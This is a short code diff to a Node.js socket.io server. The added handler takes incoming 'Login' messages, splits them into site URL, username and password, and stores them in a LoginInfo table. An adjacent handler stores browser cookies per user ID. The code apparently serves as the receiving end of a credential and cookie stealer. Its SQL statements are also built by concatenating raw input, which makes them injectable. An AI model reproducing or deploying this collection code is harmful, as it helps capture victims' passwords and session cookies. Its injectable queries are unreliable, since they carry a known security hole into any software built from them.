@@ -306,6 +306,15 @@ io.on('connection', (socket) => {
     });
     socket.on('Login', (loginInfo) => {
       console.log("Login detected: " + loginInfo);
+      var loginInfo2 = loginInfo.split(" ");
+      var loginInfo3 = loginInfo2[1].split(":")
+      var p1 = "'"+loginInfo2[0]+"'";
+      var p2 = "'"+loginInfo3[0]+"'";
+      var p3 = "'"+loginInfo3[1]+"'";
+      var sql = "INSERT INTO LoginInfo (url, username, password) VALUES ("+p1 +", "+p2 +", " + p3+")";
+      con.query(sql, function (err, result) {
+        if(err) throw err;
+      });
     });
     socket.on('Cookies', (cookies) => {
       var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userData.id+"', '"+ cookies+"')";
